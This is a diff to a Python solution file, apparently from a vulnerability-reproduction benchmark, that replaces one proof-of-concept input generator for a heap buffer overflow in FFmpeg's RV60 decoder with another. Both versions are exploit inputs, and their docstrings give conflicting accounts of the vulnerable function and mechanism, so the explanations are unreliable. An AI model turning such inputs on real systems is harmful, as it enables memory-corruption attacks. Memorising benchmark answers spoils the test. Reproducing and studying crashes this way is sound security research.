@@ -1,73 +1,35 @@
-import sys
+import os
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
-        Generates a Proof-of-Concept input that triggers a Heap Buffer Overflow
-        in the rv60dec decoder of FFmpeg (oss-fuzz:385170375).
+        Generates a PoC for the heap buffer overflow in FFmpeg's RV60 decoder.
 
-        The vulnerability is in the `ff_rv60_decode_picture` function. A
-        `memcpy` reads slice data from the main packet buffer, with the size
-        of the read determined by a 20-bit `slice_size` field from the
-        bitstream. An out-of-bounds read occurs if `slice_size` is larger
-        than the number of bytes remaining in the packet buffer.
+        The vulnerability (oss-fuzz:385170375) is in `ff_rv56_decode_picture`.
+        The function incorrectly initializes a GetBitContext with the full input
+        packet size (`buf_size`) instead of the smaller, actual slice data size
+        (`slice_buf_size`) that was copied into an internal buffer. This causes
+        the slice decoder to read past the valid data into uninitialized heap memory.
 
-        This PoC is a minimal packet that:
-        1. Sets up the decoder with an I-frame header. This self-contained
-           header specifies the frame dimensions, avoiding reliance on any
-           external codec context.
-        2. Provides a `slice_size` value that is intentionally larger than
-           the remaining packet data, triggering the overflow during the
-           `memcpy` operation.
-
-        The PoC is constructed at the bit-level to be as small as possible:
-        - Packet type (2 bits): 1 (I-frame)
-        - Custom size flag (1 bit): 0 (use predefined sizes)
-        - Predefined size index (3 bits): 0 (for 128x96 resolution, implies mb_pos_bits=6)
-        - qscale (5 bits): 1 (arbitrary)
-        - skip (2 bits): 0 (reserved)
-        - mb_pos (6 bits): 0 (start of slice)
-        - slice_size (20 bits): 2 (the malicious value)
-
-        The total header size is 39 bits, which requires 5 bytes (40 bits) for storage.
-        After the decoder reads the 39-bit header, the byte offset is floor(39/8) = 4.
-        In a 5-byte packet, only 1 byte remains (at index 4).
-        The `memcpy` attempts to read `slice_size` (which is 2) bytes from this position,
-        causing a 1-byte heap buffer overflow read.
+        This PoC is a minimal raw video packet designed to trigger this condition:
+        - It consists of a 4-byte picture header followed by 1 byte of slice data.
+        - The 4-byte header (all zeros) sets safe defaults (I-frame, QP=0) and
+          specifies `num_slices_minus1 = 0` (for a single slice).
+        - When parsed, this 5-byte packet results in:
+          - `buf_size` = 5
+          - `header_size` = 4
+          - `slice_buf_size` = 5 - 4 = 1
+        - The vulnerable `init_get_bits` call uses `buf_size` (5), while the
+          buffer only contains 1 valid byte. The subsequent read in the slice
+          decoder overflows.
         """
-        bits = []
         
-        # Frame header: 13 bits
-        # Packet type: 1 (I-frame)
-        bits.extend([0, 1])
-        # Custom picture size flag: 0 (use predefined sizes)
-        bits.append(0)
-        # Predefined size index: 0 (128x96 resolution)
-        bits.extend([0, 0, 0])
-        # qscale: 1
-        bits.extend([0, 0, 0, 0, 1])
-        # skip: 0 (reserved)
-        bits.extend([0, 0])
+        # 4-byte header: includes picture properties and num_slices_minus1 = 0
+        header = b'\x00\x00\x00\x00'
         
-        # Slice header: 26 bits
-        # mb_pos: 0
-        bits.extend([0, 0, 0, 0, 0, 0])
+        # 1 byte of arbitrary slice data. The content doesn't matter, only
+        # that its presence triggers the slice decoding logic.
+        slice_data = b'\x01'
         
-        # slice_size: 2
-        slice_size = 2
-        slice_size_bits = [int(b) for b in bin(slice_size)[2:].zfill(20)]
-        bits.extend(slice_size_bits)
-        
-        # Total bits = 39. Pad to 40 bits (5 bytes).
-        while len(bits) % 8 != 0:
-            bits.append(0)
-            
-        # Convert bit list to bytearray
-        poc_bytes = bytearray()
-        for i in range(0, len(bits), 8):
-            byte = 0
-            for bit in bits[i:i+8]:
-                byte = (byte << 1) | bit
-            poc_bytes.append(byte)
-            
-        return bytes(poc_bytes)
+        poc = header + slice_data
+        return poc
